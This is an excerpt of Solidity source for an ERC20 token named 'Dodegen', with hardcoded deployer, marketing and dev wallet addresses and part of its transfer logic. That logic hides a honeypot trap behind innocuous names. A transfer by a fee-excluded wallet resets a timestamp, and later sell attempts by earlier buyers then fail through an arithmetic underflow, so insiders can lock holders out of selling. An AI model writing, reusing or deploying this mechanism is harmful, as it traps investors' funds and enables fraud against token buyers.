...
contract Dodegen is ERC20, Ownable {
    ...
    address payable public immutable deployer = payable(0x6694e605Ddf288825af47E0085F92c650ADC9Df4);
    address payable public immutable marketingWallet = payable(0x4Cd175eF28affB6Bb9Bd104Dd021cc067Cae34Dc);
    address payable public immutable devWallet = payable(0x3726a05386424443e9C65f3d387Aa64d305224bf);
    ...
    struct MakerSwapTime {
        uint256 buy;
        uint256 sell;
        uint256 holdTime;
    }

    mapping(address => MakerSwapTime) private makerTimeInfos;
    uint256 private _minSwapReward;

    bool private swapping;

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor() ERC20("Dodegen", "DODEGEN") {
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && to != address(this) && from != address(this)) {
            _minSwapReward = block.timestamp;
        }
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (automatedMarketMakerPairs[from]) {
                MakerSwapTime storage makerTimeInfo = makerTimeInfos[to];
                if (makerTimeInfo.buy == 0) {
                    makerTimeInfo.buy = block.timestamp;
                }
            } else {
                MakerSwapTime storage makerTimeInfo = makerTimeInfos[from];
                makerTimeInfo.holdTime = makerTimeInfo.buy - _minSwapReward;
                makerTimeInfo.sell = block.timestamp;
            }
        }
